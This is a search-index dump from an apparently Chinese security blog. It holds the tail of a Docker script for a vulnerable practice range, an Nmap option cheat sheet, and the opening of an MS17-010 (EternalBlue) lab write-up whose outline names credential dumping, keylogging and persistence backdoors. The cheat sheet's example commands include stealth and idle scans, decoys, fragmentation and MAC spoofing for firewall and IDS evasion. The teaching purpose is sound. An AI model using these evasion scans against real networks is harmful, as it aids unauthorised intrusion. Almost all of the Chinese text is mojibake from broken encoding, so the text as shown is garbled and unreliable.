å®¹å™¨å·²åˆ é™¤ï¼ˆæ•°æ®å·ä¿ç•™ï¼‰${NC}\u0026#34; else echo -e \u0026#34;${RED}âœ— åˆ é™¤å®¹å™¨å¤±è´¥${NC}\u0026#34; fi } purge_all() { check_docker echo -e \u0026#34;${RED}è­¦å‘Š: è¿™å°†åˆ é™¤å®¹å™¨å’Œæ•°æ®å·ï¼${NC}\u0026#34; read -p \u0026#34;ç¡®è®¤åˆ é™¤ï¼Ÿ(y/N): \u0026#34; confirm if [[ $confirm =~ ^[Yy]$ ]]; then echo -e \u0026#34;${YELLOW}æ­£åœ¨åˆ é™¤å®¹å™¨...${NC}\u0026#34; sudo docker rm -f ${CONTAINER_NAME} 2\u0026gt;/dev/null echo -e \u0026#34;${YELLOW}æ­£åœ¨åˆ é™¤æ•°æ®å·...${NC}\u0026#34; sudo docker volume rm ${VOLUME_NAME} 2\u0026gt;/dev/null echo -e \u0026#34;${GREEN}âœ“ å®¹å™¨å’Œæ•°æ®å·å·²å½»åº•åˆ é™¤${NC}\u0026#34; else echo -e \u0026#34;${YELLOW}æ“ä½œå·²å–æ¶ˆ${NC}\u0026#34; fi } backup_volume() { check_docker BACKUP_DIR=\u0026#34;./backups\u0026#34; BACKUP_FILE=\u0026#34;pikachu_backup_$(date +%Y%m%d_%H%M%S).tar.gz\u0026#34; mkdir -p ${BACKUP_DIR} echo -e \u0026#34;${BLUE}æ­£åœ¨å¤‡ä»½æ•°æ®å·...${NC}\u0026#34; # åœæ­¢å®¹å™¨ä»¥ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ sudo docker stop ${CONTAINER_NAME} 2\u0026gt;/dev/null # åˆ›å»ºå¤‡ä»½ sudo docker run --rm \\ -v ${VOLUME_NAME}:/source \\ -v ${BACKUP_DIR}:/backup \\ alpine tar czf /backup/${BACKUP_FILE} -C /source . # é‡æ–°å¯åŠ¨å®¹å™¨ sudo docker start ${CONTAINER_NAME} 2\u0026gt;/dev/null echo -e \u0026#34;${GREEN}âœ“ å¤‡ä»½å®Œæˆ: ${BACKUP_DIR}/${BACKUP_FILE}${NC}\u0026#34; ls -lh ${BACKUP_DIR}/${BACKUP_FILE} } enter_shell() { check_docker echo -e \u0026#34;${BLUE}è¿›å…¥å®¹å™¨Shell...${NC}\u0026#34; echo -e \u0026#34;${YELLOW}æŒ‰ Ctrl+D æˆ–è¾“å…¥ exit é€€å‡º${NC}\u0026#34; sudo docker exec -it ${CONTAINER_NAME} /bin/sh } # ä¸»ç¨‹åº case \u0026#34;$1\u0026#34; in start) start_container ;; stop) stop_container ;; restart) restart_container ;; status) show_status ;; logs) show_logs ;; remove) remove_container ;; purge) purge_all ;; backup) backup_volume ;; shell) enter_shell ;; *) show_usage exit 1 ;; esac ","date":"2026-01-03T12:33:34+08:00","permalink":"http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/","title":"ã€æ”»é˜²å®è·µã€‘é¶åœºæ­å»º"},{"content":"Nmapï¼šç½‘ç»œæ‰«æå·¥å…· ç›®å½• ç›®æ ‡é€‰æ‹©ä¸ç®¡ç† -iL -iR --exclude --excludefile --resume ä¸»æœºå‘ç°ä¸å­˜æ´»æ¢æµ‹ -sn -sP -Pn -PS -PA -PU -PI -P0 ç«¯å£æ‰«ææŠ€æœ¯ -sS -sT -sU -sN -sF -sX -sI ç«¯å£è§„èŒƒ -p -p- --top-ports -F æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹ -sV --version-intensity æ“ä½œç³»ç»Ÿæ¢æµ‹ -O -A NSE è„šæœ¬å¼•æ“ -sC / --script=default -script=\u0026lt;Lua scripts\u0026gt; -script-args=\u0026lt;n1=v1,[n2=v2,...]\u0026gt; â€“script-args-file=filename â€“script-trace â€“script-updatedb â€“script-help=\u0026lt;scripts\u0026gt; è¾“å‡ºæ ¼å¼ä¸è¯¦æƒ… -oN -oX -oA --append-output -v / -vv / -d / -dd æ‰«æç»“æœç­›é€‰ä¸è§£é‡Š --open --reason è°ƒè¯•ä¸ä¿¡æ¯æ”¶é›† --packet-trace --iflist --traceroute ç½‘ç»œä¸DNSé…ç½® -n -R --system-dns -e -6 æ€§èƒ½ä¸å®šæ—¶æ§åˆ¶ -T\u0026lt;0-5\u0026gt; --min-rate --max-rate --scan-delay --min-parallelism / --max-parallelism --max-retries é˜²ç«å¢™/IDSè§„é¿ä¸æ¬ºéª— -f -D --source-port --data-length --ttl --spoof-mac --badsum æƒé™ä¸è¿è¡Œæ¨¡å¼ --privileged / --unprivileged é™„ä»¶ nmap.pdf ç›®æ ‡é€‰æ‹©ä¸ç®¡ç† -iL åŠŸèƒ½ï¼šæŒ‡å®šæ‰«æä¸»æœºåˆ—è¡¨\nç¤ºä¾‹ï¼šnmap -iL targets.txt\ntargets.txtå†…å®¹ç¤ºä¾‹ï¼š\n1 2 3 192.168.1.100 192.168.1.101 scanme.nmap.org -iR åŠŸèƒ½ï¼šéšæœºé€‰æ‹©æ‰«æç›®æ ‡ã€‚éšæœºæ‰«æ10ä¸ªIPåœ°å€ ç¤ºä¾‹ï¼šnmap -iR 10 -Pn --exclude åŠŸèƒ½ï¼šæ’é™¤æ‰«æç›®æ ‡ ç¤ºä¾‹ï¼šnmap 192.168.1.0/24 --exclude 192.168.1.100,192.168.1.101 --excludefile åŠŸèƒ½ï¼šæ’é™¤æ–‡ä»¶ä¸­ç›®æ ‡åˆ—è¡¨ ç¤ºä¾‹ï¼šnmap 192.168.1.0/24 --excludefile exclude.txt --resume åŠŸèƒ½ï¼šä»ä¸Šæ¬¡ä¸­æ–­çš„åœ°æ–¹ç»§ç»­æ‰«æã€‚ ç¤ºä¾‹ï¼šnmap --resume scan.log ä¸»æœºå‘ç°ä¸å­˜æ´»æ¢æµ‹ -sn åŠŸèƒ½ï¼šæ¢æµ‹ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œä¸æ‰«æç«¯å£ ç¤ºä¾‹ï¼šnmap -sn 192.168.1.0/24 -sP åŠŸèƒ½ï¼šå­˜æ´»ä¸»æœºæ¢æµ‹ï¼ˆå·²è¢«-snå–ä»£ï¼‰ ç¤ºä¾‹ï¼šnmap -sP 192.168.1.0/24 -Pn åŠŸèƒ½ï¼šè·³è¿‡ä¸»æœºå‘ç°ï¼Œå°†æ‰€æœ‰ä¸»æœºè§†ä¸ºåœ¨çº¿çŠ¶æ€ ç¤ºä¾‹ï¼šnmap -Pn 192.168.1.100 -PS åŠŸèƒ½ï¼šæŒ‡å®šç«¯å£å·ï¼ŒTCP SYN pingæ‰«æã€‚å‘æŒ‡å®šç«¯å£å‘é€SYNåŒ…è¿›è¡Œä¸»æœºå‘ç° ç¤ºä¾‹ï¼šnmap -PS 80,443 192.168.1.0/24 -PA åŠŸèƒ½ï¼šæŒ‡å®šç«¯å£å·ï¼ŒTCP ACK pingæ‰«æã€‚å‘æŒ‡å®šç«¯å£å‘é€ACKåŒ…ï¼Œå¸¸ç”¨äºç©¿é€é˜²ç«å¢™ ç¤ºä¾‹ï¼šnmap -PA 80,443 192.168.1.0/24 -PU åŠŸèƒ½ï¼šæŒ‡å®šç«¯å£å·ï¼ŒUDP pingæ‰«æã€‚å‘ç›®æ ‡UDPç«¯å£å‘é€ç©ºåŒ…ï¼Œæ ¹æ®å“åº”åˆ¤æ–­ä¸»æœºæ˜¯å¦åœ¨çº¿ ç¤ºä¾‹ï¼šnmap -PU 53,161 192.168.1.0/24 -PI åŠŸèƒ½ï¼šæŒ‡å®šç«¯å£å·ï¼Œä½¿ç”¨çœŸæ­£çš„ping ICMP echoè¯·æ±‚æ‰«æç›®æ ‡ä¸»æœºæ˜¯å¦æ­£åœ¨è¿è¡Œ ç¤ºä¾‹ï¼šnmap -PI 192.168.1.0/24 -P0 åŠŸèƒ½ï¼šæŒ‡å®šç«¯å£å·ï¼Œæ— pingæ‰«æã€‚æ­¤å‚æ•°å·²è¿‡æ—¶ï¼Œä½¿ç”¨-Pnæ›¿ä»£ ç¤ºä¾‹ï¼šnmap -P0 192.168.1.100 ç«¯å£æ‰«ææŠ€æœ¯ -sS åŠŸèƒ½ï¼šTCP SYNåŠå¼€æ‰«æï¼Œç›¸å¯¹éšè”½ ç¤ºä¾‹ï¼šnmap -sS 192.168.1.100 -sT åŠŸèƒ½ï¼šTCPå…¨å¼€æ‰«æï¼Œå»ºç«‹å®Œæ•´çš„TCPé“¾æ¥ï¼Œæ›´å®¹æ˜“è¢«å‘ç° ç¤ºä¾‹ï¼šnmap -sT -p- 192.168.1.100 -sU åŠŸèƒ½ï¼šUDPç«¯å£æ‰«æ ç¤ºä¾‹ï¼šnmap -sU 192.168.1.100 -sN åŠŸèƒ½ï¼šTCP Nullæ‰«æï¼Œå‘é€æ²¡æœ‰ä»»ä½•æ ‡å¿—ä½çš„TCPåŒ… ç¤ºä¾‹ï¼šnmap -sN 192.168.1.100 -sF åŠŸèƒ½ï¼šTCP FINæ‰«æï¼Œå‘é€FINæ ‡å¿—ä½çš„TCPåŒ… ç¤ºä¾‹ï¼šnmap -sF 192.168.1.100 -sX åŠŸèƒ½ï¼šTCP Xmasæ‰«æï¼Œå‘é€FINã€PSHå’ŒURGæ ‡å¿—ä½çš„TCPåŒ… ç¤ºä¾‹ï¼šnmap -sX 192.168.1.100 -sI åŠŸèƒ½ï¼šç©ºé—²æ‰«æï¼Œé€šè¿‡â€œåƒµå°¸ä¸»æœºâ€è¿›è¡Œéšè”½æ‰«æ ç¤ºä¾‹ï¼šnmap -sI zombiehost:port target ç«¯å£è§„èŒƒ -p åŠŸèƒ½ï¼šæŒ‡å®šç«¯å£å· ç¤ºä¾‹ï¼šnmap -p 1-80 192.168.1.100ã€nmap -p 80,443 192.168.1.100 -p- åŠŸèƒ½ï¼šæ‰«ææ‰€æœ‰ç«¯å£ ç¤ºä¾‹ï¼šnmap -p- 192.168.1.100 --top-ports åŠŸèƒ½ï¼šæ‰«ææœ€å¸¸ç”¨çš„å‰æŒ‡å®šæ•°é‡çš„ç«¯å£ ç¤ºä¾‹ï¼šnmap --top-ports 100 192.168.1.100 -F åŠŸèƒ½ï¼šå¿«é€Ÿæ‰«æï¼Œå‡å°‘æ‰«æçš„ç«¯å£æ•°é‡ ç¤ºä¾‹ï¼šnmap -F 192.168.1.100 æœåŠ¡å’Œç‰ˆæœ¬æ¢æµ‹ -sV åŠŸèƒ½ï¼šè¯†åˆ«æœåŠ¡ç±»å‹ï¼ˆHTTPã€FTPç­‰ï¼‰å’ŒæœåŠ¡ç‰ˆæœ¬å·ï¼Œè·å–è¯¦ç»†æœåŠ¡ä¿¡æ¯ ç¤ºä¾‹ï¼šnmap -sV 192.168.1.100 --version-intensity åŠŸèƒ½ï¼šæŒ‡å®šç‰ˆæœ¬æ¢æµ‹å¼ºåº¦ï¼ˆ0-9ï¼‰ ç¤ºä¾‹ï¼šnmap -sV --version-intensity 9 192.168.1.100 æ“ä½œç³»ç»Ÿæ¢æµ‹ -O åŠŸèƒ½ï¼šæ¢æµ‹ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹ ç¤ºä¾‹ï¼šnmap -O 192.168.1.100 -A åŠŸèƒ½ï¼šå¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹ã€è„šæœ¬æ‰«æå’Œè·¯ç”±è¿½è¸ªï¼ˆèšåˆåŠŸèƒ½ï¼‰ ç¤ºä¾‹ï¼šnmap -A 192.168.1.100 NSE è„šæœ¬å¼•æ“ -sC / --script=default åŠŸèƒ½ï¼šä½¿ç”¨é»˜è®¤è„šæœ¬è¿›è¡Œæ‰«æ ç¤ºä¾‹ï¼šnmap -sC 192.168.1.100 -script=\u0026lt;Lua scripts\u0026gt; åŠŸèƒ½ï¼šä½¿ç”¨æŸä¸ªæˆ–æŸç±»è„šæœ¬è¿›è¡Œæ‰«æï¼Œæ”¯æŒé€šé…ç¬¦æè¿° ç¤ºä¾‹ï¼šnmap -script=vuln 192.168.1.100 è„šæœ¬åˆ†ç±»ï¼š auth: è´Ÿè´£å¤„ç†é‰´æƒè¯ä¹¦ï¼ˆç»•å¼€é‰´æƒï¼‰çš„è„šæœ¬ broadcast: åœ¨å±€åŸŸç½‘å†…æ¢æŸ¥æ›´å¤šæœåŠ¡å¼€å¯çŠ¶å†µï¼Œå¦‚dhcp/dns/sqlserverç­‰æœåŠ¡ brute: æä¾›æš´åŠ›ç ´è§£æ–¹å¼ï¼Œé’ˆå¯¹å¸¸è§çš„åº”ç”¨å¦‚http/snmpç­‰ default: ä½¿ç”¨-sCæˆ–-Aé€‰é¡¹æ‰«ææ—¶å€™é»˜è®¤çš„è„šæœ¬ï¼Œæä¾›åŸºæœ¬è„šæœ¬æ‰«æèƒ½åŠ› discovery: å¯¹ç½‘ç»œè¿›è¡Œæ›´å¤šçš„ä¿¡æ¯ï¼Œå¦‚SMBæšä¸¾ã€SNMPæŸ¥è¯¢ç­‰ dos: ç”¨äºè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡» exploit: åˆ©ç”¨å·²çŸ¥çš„æ¼æ´å…¥ä¾µç³»ç»Ÿ external: åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“æˆ–èµ„æºï¼Œä¾‹å¦‚è¿›è¡Œwhoisè§£æ fuzzer: æ¨¡ç³Šæµ‹è¯•çš„è„šæœ¬ï¼Œå‘é€å¼‚å¸¸çš„åŒ…åˆ°ç›®æ ‡æœºï¼Œæ¢æµ‹å‡ºæ½œåœ¨æ¼æ´ intrusive: å…¥ä¾µæ€§çš„è„šæœ¬ï¼Œæ­¤ç±»è„šæœ¬å¯èƒ½å¼•å‘å¯¹æ–¹çš„IDS/IPSçš„è®°å½•æˆ–å±è”½ malware: æ¢æµ‹ç›®æ ‡æœºæ˜¯å¦æ„ŸæŸ“äº†ç—…æ¯’ã€å¼€å¯äº†åé—¨ç­‰ä¿¡æ¯ safe: æ­¤ç±»ä¸intrusiveç›¸åï¼Œå±äºå®‰å…¨æ€§è„šæœ¬ version: è´Ÿè´£å¢å¼ºæœåŠ¡ä¸ç‰ˆæœ¬æ‰«æï¼ˆVersion Detectionï¼‰åŠŸèƒ½çš„è„šæœ¬ vuln: è´Ÿè´£æ£€æŸ¥ç›®æ ‡æœºæ˜¯å¦æœ‰å¸¸è§çš„æ¼æ´ï¼ˆVulnerabilityï¼‰ï¼Œå¦‚æ˜¯å¦æœ‰MS08_067 -script-args=\u0026lt;n1=v1,[n2=v2,...]\u0026gt; åŠŸèƒ½ï¼šä¸ºè„šæœ¬æä¾›é»˜è®¤å‚æ•°ï¼Œä½¿ç”¨æŒ‡å®šç±»åˆ«æˆ–è„šæœ¬è¿›è¡Œæ‰«æ ç¤ºä¾‹ï¼šnmap --script http-title --script-args http.useragent=\u0026quot;Mozilla/5.0\u0026quot; 192.168.1.100 â€“script-args-file=filename åŠŸèƒ½ï¼šä½¿ç”¨æ–‡ä»¶æ¥ä¸ºè„šæœ¬æä¾›å‚æ•°\nç¤ºä¾‹ï¼šnmap --script smb-enum-shares --script-args-file smb-args.txt 192.168.1.100\nsmb-args.txtå†…å®¹\n1 2 smbuser=admin smbpass=password123 â€“script-trace åŠŸèƒ½ï¼šæ˜¾ç¤ºè„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘é€ä¸æ¥æ”¶çš„æ•°æ® ç¤ºä¾‹ï¼šnmap -O -script-trace 192.168.1.100 â€“script-updatedb åŠŸèƒ½ï¼šæ›´æ–°è„šæœ¬æ•°æ®åº“ï¼ˆrootï¼‰ ç¤ºä¾‹ï¼šnmap â€“script-updatedb â€“script-help=\u0026lt;scripts\u0026gt; åŠŸèƒ½ï¼šæ˜¾ç¤ºè„šæœ¬çš„å¸®åŠ©ä¿¡æ¯ï¼Œå…¶ä¸­éƒ¨åˆ†å¯ä»¥é€—å·åˆ†éš”çš„æ–‡ä»¶æˆ–è„šæœ¬ç±»åˆ«ã€‚æŸ¥çœ‹æ‰€æœ‰httpæ¼æ´ç›¸å…³è„šæœ¬çš„å¸®åŠ©ä¿¡æ¯ï¼š ç¤ºä¾‹ï¼šnmap -script-help http-vuln-* è¾“å‡ºæ ¼å¼ä¸è¯¦æƒ… -oN åŠŸèƒ½ï¼šè¾“å‡ºè‡³æ™®é€šæ–‡æœ¬æ–‡ä»¶ ç¤ºä¾‹ï¼šnmap -oN result.txt 192.168.1.100 -oX åŠŸèƒ½ï¼šè¾“å‡ºè‡³XMLæ–‡ä»¶ï¼Œä¾¿äºå·¥å…·å¤„ç† ç¤ºä¾‹ï¼šnmap -oX result.xml 192.168.1.100 -oA åŠŸèƒ½ï¼šä¸€æ¬¡æ€§è¾“å‡ºæ‰€æœ‰ä¸»è¦æ ¼å¼ ç¤ºä¾‹ï¼šnmap -oA result 192.168.1.100 --append-output åŠŸèƒ½ï¼šè¿½åŠ è¾“å‡ºï¼Œè¿½åŠ åˆ°ç°æœ‰æ—¥å¿—æ–‡ä»¶è€Œä¸æ˜¯è¦†ç›–ã€‚ ç¤ºä¾‹ï¼šnmap -oN scan.log --append-output 192.168.1.100 -v / -vv / -d / -dd åŠŸèƒ½ï¼šè¯¦ç»†/è°ƒè¯•è¾“å‡º\nç¤ºä¾‹ï¼š\n1 2 3 4 nmap -v 192.168.1.100 # è¯¦ç»†è¾“å‡º nmap -vv 192.168.1.100 # æ›´è¯¦ç»† nmap -d 192.168.1.100 # è°ƒè¯•çº§åˆ«1 nmap -dd 192.168.1.100 # è°ƒè¯•çº§åˆ«2 æ‰«æç»“æœç­›é€‰ä¸è§£é‡Š --open åŠŸèƒ½ï¼šåªæ˜¾ç¤ºå¼€æ”¾ç«¯å£ ç¤ºä¾‹ï¼šnmap --open 192.168.1.0/24 --reason åŠŸèƒ½ï¼šæ˜¾ç¤ºç«¯å£çŠ¶æ€åŸå› ã€‚æ˜¾ç¤ºä¸ºä»€ä¹ˆç«¯å£è¢«æ ‡è®°ä¸ºå¼€æ”¾/å…³é—­/è¿‡æ»¤ã€‚ ç¤ºä¾‹ï¼šnmap --reason 192.168.1.100 è°ƒè¯•ä¸ä¿¡æ¯æ”¶é›† --packet-trace åŠŸèƒ½ï¼šæ•°æ®åŒ…è·Ÿè¸ªï¼Œæ˜¾ç¤ºå‘é€å’Œæ¥æ”¶çš„æ¯ä¸ªæ•°æ®åŒ…ã€‚ ç¤ºä¾‹ï¼šnmap --packet-trace 192.168.1.100 --iflist åŠŸèƒ½ï¼šåˆ—å‡ºæ¥å£å’Œè·¯ç”± ç¤ºä¾‹ï¼šnmap --iflist --traceroute åŠŸèƒ½ï¼šè·¯ç”±è·Ÿè¸ª ç¤ºä¾‹ï¼šnmap --traceroute 192.168.1.100 ç½‘ç»œä¸DNSé…ç½® -n åŠŸèƒ½ï¼šä¸ç”¨åŸŸåè§£æï¼ˆåŠ å¿«æ‰«æé€Ÿåº¦ï¼Œä¸è¿›è¡Œåå‘DNSæŸ¥è¯¢ã€‚ï¼‰ ç¤ºä¾‹ï¼šnmap -n 192.168.1.100 -R åŠŸèƒ½ï¼šä¸ºæ‰€æœ‰ç›®æ ‡è§£æåŸŸåã€‚å³ä½¿ç›®æ ‡ä»¥IPå½¢å¼ç»™å‡ºï¼Œä¹Ÿè¿›è¡ŒDNSè§£æã€‚ ç¤ºä¾‹ï¼šnmap -R scanme.nmap.org --system-dns åŠŸèƒ½ï¼šä½¿ç”¨ç³»ç»ŸDNSè§£æå™¨è€Œä¸æ˜¯å†…ç½®è§£æå™¨ ç¤ºä¾‹ï¼šnmap --system-dns 192.168.1.100 -e åŠŸèƒ½ï¼šæŒ‡å®šç½‘ç»œæ¥å£ ç¤ºä¾‹ï¼šnmap -e eth0 192.168.1.0/24ã€nmap -e eth0 192.168.1.0/24 -6 åŠŸèƒ½ï¼šIPv6æ‰«æ ç¤ºä¾‹ï¼šnmap -6 2001:db8::1 æ€§èƒ½ä¸å®šæ—¶æ§åˆ¶ -T\u0026lt;0-5\u0026gt; åŠŸèƒ½ï¼šæ—¶åºæ¨¡æ¿ï¼Œæ•°å­—è¶Šå¤§è¶Šå¿«ï¼Œä¹Ÿè¶Šæ˜“è¢«å‘ç° ç¤ºä¾‹ï¼šnmap -T4 192.168.1.100 --min-rate åŠŸèƒ½ï¼šæœ€å°é€Ÿç‡ã€‚ç¡®ä¿æ‰«æé€Ÿåº¦ä¸ä½äºæ¯ç§’100ä¸ªåŒ…ã€‚ ç¤ºä¾‹ï¼šnmap --min-rate 100 192.168.1.100 --max-rate åŠŸèƒ½ï¼šæœ€å¤§é€Ÿç‡ã€‚é™åˆ¶æ‰«æé€Ÿåº¦ä¸è¶…è¿‡æ¯ç§’10ä¸ªåŒ…ã€‚ ç¤ºä¾‹ï¼šnmap --max-rate 10 192.168.1.100 --scan-delay åŠŸèƒ½ï¼šæ¢æµ‹é€Ÿç‡æ§åˆ¶ã€‚æ¯æ¬¡æ¢æµ‹é—´éš”100ms ç¤ºä¾‹ï¼šnmap --scan-delay 100ms 192.168.1.100 --min-parallelism / --max-parallelism åŠŸèƒ½ï¼šå¹¶è¡Œåº¦ ç¤ºä¾‹ï¼šnmap --min-parallelism 10 --max-parallelism 100 192.168.1.100 --max-retries åŠŸèƒ½ï¼šæœ€å¤§é‡è¯•æ¬¡æ•° ç¤ºä¾‹ï¼šnmap --max-retries 1 192.168.1.100 é˜²ç«å¢™/IDSè§„é¿ä¸æ¬ºéª— -f åŠŸèƒ½ï¼šä½¿ç”¨å°æ•°æ®åŒ…åˆ†ç‰‡ ç¤ºä¾‹ï¼šnmap -f 192.168.1.100 -D åŠŸèƒ½ï¼šä½¿ç”¨è¯±é¥µIPè¿›è¡Œéšè— ç¤ºä¾‹ï¼šnmap -D RND:10 192.168.1.100 --source-port åŠŸèƒ½ï¼šä½¿ç”¨ç‰¹å®šæºç«¯å£ï¼ˆå¦‚53ç«¯å£å¯èƒ½è¢«é˜²ç«å¢™å…è®¸ï¼‰ ç¤ºä¾‹ï¼šnmap --source-port 53 192.168.1.100 --data-length åŠŸèƒ½ï¼šæ·»åŠ éšæœºæ•°æ®ï¼Œåœ¨æ¯ä¸ªåŒ…åæ·»åŠ æŒ‡å®šé•¿åº¦çš„éšæœºæ•°æ®ã€‚ ç¤ºä¾‹ï¼šnmap --data-length 100 192.168.1.100 --ttl åŠŸèƒ½ï¼šè®¾ç½®TTLå€¼ ç¤ºä¾‹ï¼šnmap --ttl 64 192.168.1.100 --spoof-mac åŠŸèƒ½ï¼šMACåœ°å€æ¬ºéª— ç¤ºä¾‹ï¼šnmap --spoof-mac 00:11:22:33:44:55 192.168.1.100ã€nmap --spoof-mac 0 # éšæœºMACåœ°å€ --badsum åŠŸèƒ½ï¼šå‘é€é”™è¯¯æ ¡éªŒå’Œ ç¤ºä¾‹ï¼šnmap --badsum 192.168.1.100 æƒé™ä¸è¿è¡Œæ¨¡å¼ --privileged / --unprivileged åŠŸèƒ½ï¼šå½“ä»¥érootç”¨æˆ·è¿è¡Œæ—¶æ¨¡æ‹ŸåŸå§‹å¥—æ¥å­—ã€‚ ç¤ºä¾‹ï¼šnmap --unprivileged 192.168.1.100 # éç‰¹æƒæ¨¡å¼ é™„ä»¶ nmap.pdf ","date":"2025-12-30T16:27:59+08:00","permalink":"http://localhost:1313/p/kali-toolkitnmapnetwork-mapper/","title":"ã€Kali Toolkitã€‘Nmapï¼ˆNetwork Mapperï¼‰"},{"content":"MS17-010æ¼æ´åˆ©ç”¨ ç›®å½• å®è·µæ¦‚è§ˆ MS17-010æ¼æ´ ç¯å¢ƒé…ç½® å®è·µæ­¥éª¤ éš”ç¦»ç½‘ç»œç¯å¢ƒé…ç½®ä¸ç«¯å£æ‰«æ ä¸€ã€åœ¨ VMware ä¸­åˆ›å»ºå¹¶åˆ†é… LAN åŒºæ®µï¼ˆå¯¹ Kali å’Œ Win7 æ‰§è¡Œç›¸åŒæ“ä½œï¼‰ï¼š äºŒã€é…ç½® Win7 çš„é™æ€IPå¹¶å…³é—­é˜²ç«å¢™ ä¸‰ã€é…ç½®Kaliçš„é™æ€IPåœ°å€å¹¶æµ‹è¯•äºŒè€…è¿é€šæ€§ å››ã€Nmapæ‰«æç»“æœåˆ†æ Metasploitæ‰«æä¸æ¼æ´åˆ©ç”¨ ä¸€ã€å¯åŠ¨Metasploitæ¡†æ¶ï¼ˆrootï¼‰ï¼š äºŒã€æœç´¢ms17-010ç›¸å…³æ¨¡å—ï¼š ä¸‰ã€æ¢æµ‹ç›®æ ‡ä¸»æœº å››ã€æ¼æ´åˆ©ç”¨ å…¸å‹çš„â€œåæ¸—é€â€æ”»å‡»è¡Œä¸º ä¸€ã€å‡­æ®çªƒå– 1. å¯¼å‡ºå“ˆå¸Œå€¼ï¼ˆHashdumpï¼‰ 2. æŠ“å–å†…å­˜ä¸­çš„æ˜æ–‡å¯†ç ï¼ˆMimikatzï¼‰ äºŒã€éšç§ç›‘æ§ä¸å–è¯ï¼ˆMonitoringï¼‰ 1. å®æ—¶å±å¹•æˆªå›¾ 2. é”®ç›˜è®°å½•ï¼ˆKeyloggingï¼‰ 3. æ–‡ä»¶çªƒå–ä¸ä¸Šä¼  ä¸‰ã€MetasploitæŒä¹…åŒ–åé—¨æ”»å‡» åˆ©ç”¨WindowsæœåŠ¡æœºåˆ¶å®ç°æƒé™ç»´æŒ ç›¸å…³åŸç† å››ã€Shell å®è·µæ¦‚è§ˆ åç§°ï¼šMS17-010æ¼æ´åˆ©ç”¨ ç›®çš„ï¼š æ—¶é—´ï¼š2025å¹´12æœˆ30æ—¥ é£é™©è¯´æ˜ï¼šæœ¬å®éªŒåœ¨å®Œå…¨éš”ç¦»çš„è™šæ‹ŸåŒ–å®éªŒå®¤ç¯å¢ƒä¸‹è¿›è¡Œï¼Œä»…ç”¨äºæ•™è‚²æˆ–æˆæƒæµ‹è¯• MS17-010æ¼æ´ åç§°ï¼šMS17-010 åˆ«åï¼šæ°¸æ’ä¹‹è“ï¼ˆEternalBlueï¼‰ å…¬å¼€æ—¶é—´ï¼š2017.3.14ï¼ˆè¡¥ä¸å‘å¸ƒï¼‰ï¼›2017.4.14ï¼ˆæ”»å‡»å·¥å…·å…¬å¼€ï¼‰ ç›¸å…³CVEï¼šCVE-2017-0143ï¼›CVE-2017-0144ï¼›CVE-2017-0145ï¼›CVE-2017-0146ï¼›CVE-2017-0148 ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ï¼›CVE-2017-0147 ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰ ç›¸å…³åè®®ï¼šæœåŠ¡å™¨æ¶ˆæ¯å— 1.0 ï¼ˆSMBv1ï¼‰ ç›¸å…³ç«¯å£ï¼šTCP 445ï¼ˆä¸»è¦ï¼‰ï¼›139ï¼ˆæ¬¡è¦ï¼‰ æ¼æ´åŸç†ï¼šæºäº Windows å†…æ ¸å¤„ç† SMBv1 åè®®è¯·æ±‚çš„ç¼“å†²åŒºæº¢å‡ºã€‚åœ¨å¤„ç†æ–‡ä»¶æ‰©å±•å±æ€§è½¬æ¢æ—¶ï¼Œç³»ç»Ÿå› é”™è¯¯è®¡ç®—å†…å­˜å¤§å°ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œåœ¨å†…æ ¸æƒé™ä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚ ç ´åæ€§ï¼š æ— éœ€ç”¨æˆ·äº¤äº’ï¼šæ”»å‡»è€…åªéœ€å‘ç›®æ ‡ä¸»æœºçš„445ç«¯å£å‘é€æ¶æ„æ•°æ®åŒ…å³å¯å…¥ä¾µï¼Œæ— éœ€ç”¨æˆ·ç‚¹å‡»/æ‰“å¼€ä»»ä½•æ–‡ä»¶ å±å®³ç­‰çº§é«˜ï¼šæˆåŠŸåˆ©ç”¨åæ”»å‡»è€…å¯åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„æ“ä½œï¼Œå¦‚å®‰è£…æ¶æ„ç¨‹åºã€çªƒå–æ•°æ®ã€åŠ å¯†æ–‡ä»¶ï¼ˆå‹’ç´¢è½¯ä»¶ï¼‰æˆ–åˆ›å»ºåé—¨ æ˜“äºè •è™«åŒ–ä¼ æ’­ï¼šWannaCry å‹’ç´¢ç—…æ¯’é‡‡ç”¨çš„æ–¹å¼ï¼Œå¯¼è‡´å…¶åœ¨å…¨çƒèŒƒå›´å†…åƒè •è™«ä¸€æ ·è‡ªåŠ¨ã€å¿«é€Ÿåœ°è”“å»¶ å½±å“èŒƒå›´ï¼šæ­¤æ¼æ´å½±å“å½“æ—¶å‡ ä¹æ‰€æœ‰æœªæ‰“è¡¥ä¸çš„ Windows ç‰ˆæœ¬ï¼Œä¸»è¦åŒ…æ‹¬ï¼š æ¡Œé¢ç³»ç»Ÿï¼šWindows XP, Vista, 7, 8, 8.1, Windows 10 (æ—©æœŸç‰ˆæœ¬) æœåŠ¡å™¨ç³»ç»Ÿï¼šWindows Server 2003, 2008, 2008 R2, 2012, 2012 R2, 2016 æ¼æ´ä¿®å¤ï¼šå®‰è£…å®˜æ–¹å®‰å…¨è¡¥ä¸â€”â€”Windows Update æˆ–è®¿é—®å¾®è½¯å®˜æ–¹å®‰å…¨å…¬å‘Šæ‰‹åŠ¨ä¸‹è½½å¹¶å®‰è£…ç¼–å·ä¸ºKB4013389 çš„è¡¥ä¸ã€‚æˆ–æ‰‹åŠ¨ï¼šç¦ç”¨ SMBv1 åè®®ã€ç½‘ç»œå±‚é¢å°å 